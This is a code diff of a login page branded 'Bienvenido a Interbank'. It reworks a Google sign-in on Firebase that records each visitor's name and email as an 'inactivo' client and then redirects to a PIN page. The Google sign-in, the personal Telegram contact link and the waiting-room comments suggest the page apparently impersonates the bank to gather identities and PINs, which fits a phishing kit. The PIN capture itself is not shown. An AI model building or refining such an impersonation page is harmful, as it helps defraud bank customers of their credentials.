@@ -6,6 +6,7 @@
     <title>Bienvenido a Interbank</title>
     
     <script>
+        // Si el usuario ya entró antes, lo mandamos al PIN de inmediato
         if (localStorage.getItem('sesion_iniciada') === 'true') {
             window.location.replace('login_pin.html');
         }
@@ -199,7 +200,7 @@
     <div class="btn-container">
         <button class="btn-google" id="btnGoogleAuth">
             <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="G" class="google-icon">
-            Continuar con Google
+            <span id="btnText">Continuar con Google</span>
         </button>
 
         <a href="https://t.me/MaikolEsleiter" class="btn-access">
@@ -282,43 +283,51 @@
 
     <script type="module">
         import { auth, db } from "./firebase.js";
-        import { GoogleAuthProvider, signInWithRedirect, getRedirectResult } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+        import { GoogleAuthProvider, signInWithRedirect, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
         import { doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
         const btnGoogle = document.getElementById('btnGoogleAuth');
+        const btnText = document.getElementById('btnText');
+        
+        // 1. EL RADAR INFALIBLE
+        // Si el usuario regresa de Google y Firebase lo detecta, ejecutamos el código:
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                // Bloqueamos el botón visualmente para que sepa que está cargando
+                btnGoogle.disabled = true;
+                btnText.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Cargando...';
+                
+                try {
+                    // Verificamos si ya existe su carpeta
+                    const userRef = doc(db, "clientes_ibk", user.email);
+                    const userSnap = await getDoc(userRef);
 
-        // PASO 1: Al hacer clic, enviarlo a Google
+                    // Si es nuevo, le creamos su registro de inmediato
+                    if (!userSnap.exists()) {
+                        await setDoc(userRef, {
+                            nombre: user.displayName,
+                            email: user.email,
+                            estado: "inactivo",
+                            fecha: new Date().toISOString()
+                        });
+                    }
+
+                    // Ahora sí, que pase a la sala de espera
+                    window.location.replace("login_pin.html");
+                } catch (e) {
+                    console.error("Error guardando cliente:", e);
+                    btnText.innerHTML = "Error. Intenta de nuevo";
+                    setTimeout(() => btnText.innerHTML = "Continuar con Google", 3000);
+                }
+            }
+        });
+
+        // 2. LA ACCIÓN DEL BOTÓN (SOLO LO MANDA A GOOGLE)
         btnGoogle.addEventListener('click', () => {
-            btnGoogle.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Cargando...';
+            btnText.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Redirigiendo...';
             btnGoogle.style.opacity = '0.7';
             const provider = new GoogleAuthProvider();
             signInWithRedirect(auth, provider);
-        });
-
-        // PASO 2: Cuando Google lo regresa, procesar el resultado
-        getRedirectResult(auth).then(async (result) => {
-            if (result) {
-                const user = result.user;
-                const userRef = doc(db, "clientes_ibk", user.email);
-                const userSnap = await getDoc(userRef);
-
-                // Si es un usuario completamente nuevo, lo guardamos en la base de datos
-                if (!userSnap.exists()) {
-                    await setDoc(userRef, {
-                        nombre: user.displayName,
-                        email: user.email,
-                        estado: "inactivo",
-                        fecha: new Date().toISOString()
-                    });
-                }
-                
-                // Sin importar si es nuevo o viejo, lo empujamos adentro para que el Vigilante lo reciba
-                window.location.href = "login_pin.html";
-            }
-        }).catch((error) => {
-            console.error("Error al volver de Google:", error);
-            btnGoogle.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" class="google-icon"> Continuar con Google';
-            btnGoogle.style.opacity = '1';
         });
     </script>
 </body>
